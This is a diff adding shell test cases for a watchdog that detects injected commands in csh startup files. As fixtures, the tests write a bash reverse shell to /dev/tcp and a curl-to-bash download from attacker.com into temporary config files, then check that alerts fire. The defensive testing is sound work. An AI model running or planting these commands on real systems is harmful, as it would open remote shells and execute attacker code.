@@ -175,3 +175,55 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-csh-config -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): csh-config-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
+    # csh-config injection patterns are NEVER routine; the alert
+    # must persist across runs until operator explicitly re-
+    # baselines.
+    seed_benign
+    run_wd
+    printf '# csh.cshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CSHRC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"csh_config_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    # csh config uses # as comment marker. Operator notes about
+    # hypothetical attack patterns must not surface as real
+    # injection.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# csh.cshrc\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nsetenv PATH /usr/bin:/bin\n' > "${CSHRC}"
+    run_wd
+    ! cap | grep -q '"event":"csh_config_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-sh injection family — bash subshell variant — also detected)" {
+    # curl http://... | bash variant.
+    seed_benign
+    run_wd
+    printf '# csh.cshrc\ncurl -s http://attacker.com/payload.sh | bash\n' > "${CSHRC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-file scan: csh.login axis also scanned, not only csh.cshrc — full per-login surface)" {
+    # /etc/csh.login is sourced for LOGIN shells specifically.
+    # Attackers may target it directly. Watchdog must walk all
+    # three files (csh.cshrc + csh.login + csh.logout).
+    CSHLOGIN="${TMP}/csh.login"
+    seed_benign
+    FILES_V="${CSHRC} ${CSHLOGIN}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in csh.login.
+    printf '# csh.login\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CSHLOGIN}"
+    FILES_V="${CSHRC} ${CSHLOGIN}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
